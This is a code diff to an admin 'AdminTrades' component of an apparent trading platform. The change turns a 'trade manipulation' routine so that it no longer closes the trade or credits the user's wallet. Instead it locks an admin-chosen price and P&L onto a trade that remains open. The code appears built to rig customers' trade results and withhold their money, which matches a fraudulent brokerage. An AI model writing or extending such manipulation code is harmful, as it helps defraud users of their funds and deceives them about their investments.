@@ -156,24 +156,14 @@ const AdminTrades = () => {
           return;
         }
 
+        // Keep trade open — just lock in the manipulated price and P&L
         await supabase.from("trades").update({
-          status: "closed",
-          closed_at: new Date().toISOString(),
-          pnl: forcedPnl,
           current_price: targetPrice,
+          pnl: forcedPnl,
         }).eq("id", trade.id);
 
-        const { data: wallet } = await supabase
-          .from("wallets").select("id, balance")
-          .eq("user_id", trade.user_id).eq("currency", "EUR").maybeSingle();
-        if (wallet) {
-          await supabase.from("wallets").update({
-            balance: Number(wallet.balance) + Number(trade.size) + forcedPnl,
-          }).eq("id", wallet.id);
-        }
-
         setManipulating(prev => ({ ...prev, [trade.id]: false }));
-        toast.success(`Trade manipulation complete — P&L: €${forcedPnl.toFixed(2)}`);
+        toast.success(`Manipulation complete — P&L locked at €${forcedPnl.toFixed(2)}. Trade remains open.`);
         fetchTrades();
       }
     }, intervalMs);
